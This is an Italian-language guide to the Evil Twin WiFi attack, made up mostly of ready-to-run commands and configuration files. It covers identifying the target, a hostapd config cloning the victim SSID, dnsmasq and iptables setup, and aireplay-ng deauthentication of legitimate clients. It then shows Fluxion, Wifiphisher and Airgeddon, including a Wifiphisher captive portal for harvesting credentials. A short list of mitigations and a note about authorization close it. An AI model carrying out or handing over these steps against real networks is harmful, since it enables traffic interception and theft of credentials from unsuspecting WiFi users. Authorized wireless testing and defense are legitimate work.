# Evil Twin Attack

## Scopo

Questa guida copre l'attacco Evil Twin, una tecnica in cui l'attaccante crea un access point malevolo con lo stesso SSID di una rete legittima per intercettare il traffico degli utenti.

## Prerequisiti

- Kali Linux
- Scheda WiFi con supporto monitor mode e packet injection
- hostapd, dnsmasq
- **Autorizzazione scritta** per i test

## Installazione

```bash
sudo apt-get update
sudo apt-get install hostapd dnsmasq aircrack-ng
```

---

## Workflow Attacco

```
1. Identifica target AP (SSID, canale, BSSID)
2. Deautentica client legittimi
3. Avvia Evil Twin sullo stesso canale
4. Client si riconnettono all'Evil Twin
5. Intercetta traffico / cattura credenziali
```

---

## Setup Manuale

### 1. Identifica Target

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Scan reti
sudo airodump-ng wlan0mon

# Nota: BSSID, CH, ESSID del target
```

### 2. Configura Evil Twin

```bash
# /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
```

### 3. Configura DHCP

```bash
# /etc/dnsmasq.conf
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
```

### 4. Setup Network

```bash
# Configura interfaccia
sudo ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0

# Abilita IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# NAT per connettività internet
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

### 5. Avvia Servizi

```bash
# Avvia hostapd
sudo hostapd /etc/hostapd/hostapd.conf

# Avvia dnsmasq
sudo dnsmasq -C /etc/dnsmasq.conf -d
```

### 6. Deauth Target

```bash
# Forza client a disconnettersi
sudo aireplay-ng --deauth 50 -a TARGET_BSSID wlan0mon
```

---

## Tool Automatizzati

### Fluxion

```bash
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh
```

### Wifiphisher

```bash
sudo apt-get install wifiphisher
sudo wifiphisher -aI wlan0 -eI wlan1 --essid "TargetNetwork"
```

### Airgeddon

```bash
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh
```

---

## Credential Harvesting

### Captive Portal

```bash
# Con wifiphisher
sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade

# Scenari disponibili:
# - firmware-upgrade
# - oauth-login
# - wifi-connect
```

---

## Mitigazioni

- **802.11w**: Management Frame Protection
- **EAP-TLS**: Autenticazione certificati
- **WIDS**: Wireless Intrusion Detection
- **VPN**: Crittografa traffico utente
- **User awareness**: Training anti-phishing

## Best Practices

- **Solo lab autorizzati**: Mai su reti pubbliche senza permesso
- **Documentazione**: Log tutte le attività
- **Cleanup**: Ripristina configurazioni dopo test
- **Legal compliance**: Verifica normative locali

## Riferimenti

- [Hostapd Documentation](https://w1.fi/hostapd/)
- [Wifiphisher GitHub](https://github.com/wifiphisher/wifiphisher)
- [Fluxion GitHub](https://github.com/FluxionNetwork/fluxion)
